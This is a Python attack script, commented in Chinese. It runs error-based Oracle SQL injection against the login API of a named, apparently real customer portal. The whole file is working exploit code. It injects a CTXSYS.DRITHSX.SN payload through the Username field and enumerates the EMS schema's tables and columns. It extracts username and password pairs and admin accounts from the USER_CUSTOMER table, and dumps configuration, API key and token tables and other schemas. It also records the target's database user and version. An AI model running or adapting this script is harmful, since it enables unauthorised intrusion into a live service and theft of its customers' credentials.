#!/usr/bin/env python3
"""
深度搜索敏感信息 - 使用ALL_TABLES和其他视图
"""

import requests
import json
import time

class DeepSearcher:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def search_all_user_tables(self):
        """搜索所有用户相关表（用ALL_TABLES）"""
        print("=" * 80)
        print("👤 搜索用户/管理员表")
        print("=" * 80)
        
        keywords = ['USER', 'ADMIN', 'CUSTOMER', 'LOGIN', 'AUTH']
        
        found = []
        
        for keyword in keywords:
            print(f"\n关键词: {keyword}")
            
            # 使用ALL_TABLES
            query = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=5"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ {result}")
                found.append(result)
            else:
                print(f"  未找到")
            
            time.sleep(1)
        
        return found
    
    def extract_user_customer_data(self):
        """提取USER_CUSTOMER表数据"""
        print("\n" + "=" * 80)
        print("🔑 提取USER_CUSTOMER表数据")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        # 检查表是否存在
        query_exist = f"SELECT COUNT(*) FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME='{table}'"
        exists = self.extract_via_error(query_exist)
        
        if not exists or exists == '0':
            print(f"表不存在")
            return
        
        print(f"✅ 表存在")
        
        # 获取字段列表
        print(f"\n字段列表:")
        for i in range(1, 21):
            query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
            col = self.extract_via_error(query_col)
            
            if col and col != 'NULL':
                print(f"  {i}. {col}")
            
            time.sleep(0.5)
        
        # 提取账号数据
        print(f"\n提取账号样本:")
        
        # 尝试不同字段组合
        field_sets = [
            ['USERNAME', 'PASSWORD'],
            ['USER_NAME', 'PASSWORD'],
            ['EMAIL', 'PASSWORD'],
            ['PHONE', 'PASSWORD'],
            ['CUSTOMER_CODE', 'PASSWORD'],
        ]
        
        for fields in field_sets:
            field_str = '||CHR(124)||'.join(fields)
            query = f"SELECT {field_str} FROM EMS.{table} WHERE ROWNUM<=5"
            result = self.extract_via_error(query)
            
            if result and 'ORA-' not in result:
                print(f"\n  ✅ 字段组合: {' | '.join(fields)}")
                print(f"  数据: {result}")
                break
            
            time.sleep(1)
        
        # 查找admin账号
        print(f"\n查找管理员账号:")
        
        admin_fields = ['USERNAME', 'USER_NAME', 'EMAIL', 'CUSTOMER_CODE']
        
        for field in admin_fields:
            query = f"SELECT {field}||'|'||PASSWORD FROM EMS.{table} WHERE UPPER({field}) LIKE '%ADMIN%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and 'ORA-' not in result and result != 'NULL':
                print(f"\n  🚨 找到admin账号 ({field}):")
                print(f"    {result}")
                break
            
            time.sleep(1)
        
        # 获取总用户数
        print(f"\n统计:")
        query_count = f"SELECT COUNT(*) FROM EMS.{table}"
        count = self.extract_via_error(query_count)
        
        if count:
            print(f"  总用户数: {count}")
    
    def search_api_config_tables(self):
        """搜索API配置表"""
        print("\n" + "=" * 80)
        print("🔐 搜索API/配置表")
        print("=" * 80)
        
        keywords = ['CONFIG', 'SETTING', 'PARAMETER', 'API', 'KEY', 'TOKEN']
        
        for keyword in keywords:
            print(f"\n关键词: {keyword}")
            
            query = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ {result}")
                
                # 获取数据
                time.sleep(1)
                query_data = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{result} T WHERE ROWNUM<=3)"
                data = self.extract_via_error(query_data)
                
                if data and 'ORA-' not in data:
                    print(f"  数据: {data}")
            
            time.sleep(1)
    
    def list_all_ems_tables(self):
        """列出所有EMS表"""
        print("\n" + "=" * 80)
        print("📋 列出所有EMS表（批量）")
        print("=" * 80)
        
        # 分批获取表名
        tables = []
        
        for batch in range(1, 11):  # 获取前50个表，每批5个
            start = (batch - 1) * 5 + 1
            end = batch * 5
            
            print(f"\n批次 {batch}: 表 {start}-{end}")
            
            for i in range(start, end + 1):
                query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' ORDER BY TABLE_NAME) WHERE RN={i}"
                table = self.extract_via_error(query)
                
                if table and table != 'NULL':
                    print(f"  {i}. {table}")
                    tables.append(table)
                
                time.sleep(0.5)
        
        return tables
    
    def check_interesting_tables(self, all_tables):
        """检查有趣的表"""
        print("\n" + "=" * 80)
        print("🔍 检查可能包含敏感信息的表")
        print("=" * 80)
        
        interesting_keywords = [
            'USER', 'ADMIN', 'PASSWORD', 'AUTH', 'LOGIN',
            'CONFIG', 'SETTING', 'KEY', 'TOKEN', 'API',
            'CREDENTIAL', 'SECRET', 'SESSION'
        ]
        
        interesting_tables = []
        
        for table in all_tables:
            table_upper = table.upper()
            
            for keyword in interesting_keywords:
                if keyword in table_upper:
                    interesting_tables.append(table)
                    print(f"\n  🎯 {table} - 包含关键词: {keyword}")
                    
                    # 获取记录数
                    time.sleep(1)
                    query_count = f"SELECT COUNT(*) FROM EMS.{table}"
                    count = self.extract_via_error(query_count)
                    
                    if count:
                        print(f"    记录数: {count}")
                    
                    # 获取字段
                    time.sleep(1)
                    query_cols = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN<=5"
                    cols = self.extract_via_error(query_cols)
                    
                    if cols:
                        print(f"    字段: {cols}")
                    
                    break
            
            time.sleep(0.5)
        
        return interesting_tables
    
    def check_web_service_tables(self):
        """检查Web服务相关表"""
        print("\n" + "=" * 80)
        print("🌐 检查Web服务/接口表")
        print("=" * 80)
        
        keywords = ['WEB', 'SERVICE', 'API', 'ENDPOINT', 'URL', 'HTTP']
        
        for keyword in keywords:
            print(f"\n关键词: {keyword}")
            
            query = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ {result}")
                
                # 获取样本数据
                time.sleep(1)
                query_sample = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{result} T WHERE ROWNUM<=2)"
                sample = self.extract_via_error(query_sample)
                
                if sample:
                    print(f"  样本: {sample}")
            
            time.sleep(1)
    
    def check_other_schemas(self):
        """检查其他Schema"""
        print("\n" + "=" * 80)
        print("🗄️  查找其他Schema")
        print("=" * 80)
        
        # 获取所有可访问的schema
        for i in range(1, 11):
            query = f"SELECT OWNER FROM (SELECT DISTINCT OWNER, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER NOT IN ('SYS','SYSTEM','CTXSYS','MDSYS','WMSYS','XDB','APEX_030200')) WHERE RN={i}"
            schema = self.extract_via_error(query)
            
            if schema and schema != 'NULL':
                print(f"\n  {i}. Schema: {schema}")
                
                # 查看这个schema的表
                time.sleep(1)
                query_tables = f"SELECT COUNT(*) FROM ALL_TABLES WHERE OWNER='{schema}'"
                count = self.extract_via_error(query_tables)
                
                if count:
                    print(f"     表数量: {count}")
                
                # 查找用户表
                time.sleep(1)
                query_user = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{schema}' AND TABLE_NAME LIKE '%USER%' AND ROWNUM=1"
                user_table = self.extract_via_error(query_user)
                
                if user_table and user_table != 'NULL':
                    print(f"     用户表: {user_table}")
            
            time.sleep(1)
    
    def run_deep_search(self):
        """执行深度搜索"""
        print("=" * 80)
        print("🔍 深度搜索敏感信息")
        print("=" * 80)
        print(f"\n当前用户: BCCPCOM")
        print(f"当前Schema: EMS")
        print(f"数据库: Oracle 11g")
        print(f"IP: 192.168.88.1")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        # 执行搜索
        self.search_all_user_tables()
        self.extract_user_customer_data()
        self.search_api_config_tables()
        
        all_tables = self.list_all_ems_tables()
        
        if all_tables:
            self.check_interesting_tables(all_tables)
        
        self.check_web_service_tables()
        self.check_other_schemas()
        
        print("\n" + "=" * 80)
        print("🎉 搜索完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    searcher = DeepSearcher(target_url)
    searcher.run_deep_search()
